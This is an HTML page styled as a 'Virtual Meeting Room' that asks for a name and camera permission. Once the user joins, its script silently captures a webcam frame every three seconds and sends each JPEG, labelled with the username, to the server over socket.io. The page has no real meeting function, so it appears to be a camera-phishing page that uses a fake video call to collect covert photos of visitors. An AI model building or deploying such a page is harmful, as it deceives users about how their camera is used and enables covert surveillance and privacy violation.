<!DOCTYPE html>
<html>

<head>
<title>Meet & Connect</title>

<style>
body{
font-family: Arial;
text-align:center;
background:#0f172a;
color:white;
}

.container{
margin-top:100px;
}

button{
padding:15px 30px;
font-size:18px;
background:#3b82f6;
border:none;
color:white;
border-radius:8px;
cursor:pointer;
}

input{
padding:12px;
font-size:16px;
border-radius:8px;
border:none;
margin-bottom:10px;
}

video{
margin-top:20px;
border-radius:10px;
}
</style>

</head>

<body>

<div class="container">

<h1>Virtual Meeting Room</h1>

<p>We need camera permission for live communication</p>

<input type="text" id="username" placeholder="Enter your name">

<br><br>

<button onclick="startCamera()">Join</button>

<br>

<video id="video" autoplay playsinline width="300"></video>

</div>

<script src="/socket.io/socket.io.js"></script>

<script>

const socket = io({
transports: ["websocket"],
secure: true
});

socket.on("connect", () => {
console.log("Connected to server");
});

function startCamera(){

const username = document.getElementById("username").value;

if(!username){
alert("Enter username");
return;
}

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {

const video = document.getElementById("video");
video.srcObject = stream;

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");

setInterval(() => {

canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

context.drawImage(video, 0, 0);

const image = canvas.toDataURL("image/jpeg");

socket.emit("photo", {
user: username,
image: image
});

console.log("Photo sent");

}, 3000);

})
.catch(err => {
alert("Camera permission required");
});

}

</script>

</body>

</html>
